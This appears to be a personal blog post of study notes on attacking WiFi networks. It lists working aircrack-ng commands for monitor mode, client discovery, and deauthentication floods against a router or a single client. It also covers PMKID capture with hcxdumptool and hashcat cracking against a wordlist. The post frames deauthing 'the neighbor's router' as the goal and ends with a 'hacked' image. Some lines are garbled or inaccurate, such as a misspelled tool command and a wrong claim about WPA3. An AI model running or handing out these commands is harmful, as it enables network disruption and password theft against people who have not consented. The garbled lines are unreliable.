---
layout : post
title : Sniffing packets and testing those
date : 21-06-21
---

Wireless Network Adapter aka wifi card that is used to connect to wifi's 

WEP : oldest
WPA : Any certificate can lead to leak 
WPA2 : kick a user, then he reconnects, capture the certificate, 4-way handshake ,capture the certificate in betweeen   
WPA3 : all password attempts need to be on internet 



## Monitor mode
In this mode it becomes a radio sniffer, listens to all wireless signals in the air on a specific channel. Hear's everything happening in the room 

Wifi card can listen to 2.4Ghz, 5Ghz, 6Ghz bands 

It can sniff to any frequency band that its capable of in the above range

So what you do is you deauth the neighbor's router by sending 'deauthentication packets' ? ( how can I send deauth packets ? )
deauth is broken, part of 802.11 management frames, are not protected in WPA/WPA2 - Personal , can be spoofed / faked by anyone in the range 

Particular client deauth attack 

```
BSSID              STATION            PWR   Rate    Lost    Frames  Probes
AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -45   1e-1     0       800     -
```

Station MAC is the client MAC 

Get all clients :
`airodump-ng --bssid <router MAC> -c <channel> wlan0mon`

Deauth bombing: 
`aireplay-ng --deauth 100 -a <router MAC> wlan0mon`

Deauth particular user : 
`aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon`



#  scan the wifi : 
sudo iwlist scan 

# top networks
sudo airdump-ng start wlo1mon , or , 
sudo airodump-ng wlo1mon --write scan --output-format csv

# get all wifi present and bssid
sudo iw dev wlo1 scan 

## Get into monitor mode 
sudo airmon-ng start wlo1

## manager mode
sudo airmon-ng stop wlo1mon


## airodump : 
sudo airodump-ng --bssid <bssid> -c <channel-name> -w capture wlo1mon

eg:
sudo airodump-ng --bssid 6c:4f:89:9a:3f:af -c 44 -w capture wlo1mon

## aireplay 

sudo aireplay-ng --deauth 20 -a 6c:4f:89:9a:3f:af wlo1mon --ignore-negative-one


# HASHCAT 
Pairwise Master Key Identifier (PMKID) 

##-- PMKID --##

#hcxdump-tool
sudo hcxdumptool -i wlo1mon -w pmkid.pcapng --rds=1

#tool to unpack
hcxpcapngtool -o pmkid.hccapx pmkid.pcapng

#
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng


#
hashcat -m 22000 pmkid.hc22000 rockyou.txt --force


![hacked](https://github.com/user-attachments/assets/8ab726b5-c6b8-43e9-b184-a7207d1f3163)






